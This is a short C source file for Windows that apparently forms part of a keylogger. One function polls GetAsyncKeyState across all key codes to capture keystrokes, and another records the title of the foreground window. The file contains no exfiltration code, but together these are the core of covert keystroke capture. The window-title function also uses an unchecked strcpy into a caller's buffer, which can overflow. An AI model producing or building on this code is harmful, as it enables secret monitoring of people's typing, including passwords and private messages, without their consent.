#define _CRT_SECURE_NO_WARNINGS 1

#include "definitions.h"
#include "Utils.h"

#include <Windows.h>
#include <stdio.h>


char CaptureKeyboard() {
	int res;
	for(int c = 0x01; c < 0xFE; c++) {
			res = GetAsyncKeyState(c);
			if(res != 0) {
				return c;
			}
	}
	return NULL;
}

void GetCurrentWindowName( _Out_ char *wndName) {
	char wnd_title[512];
	HWND hwnd=GetForegroundWindow();
	GetWindowText(hwnd,wnd_title,sizeof(wnd_title));
	strcpy(wndName, wnd_title);
}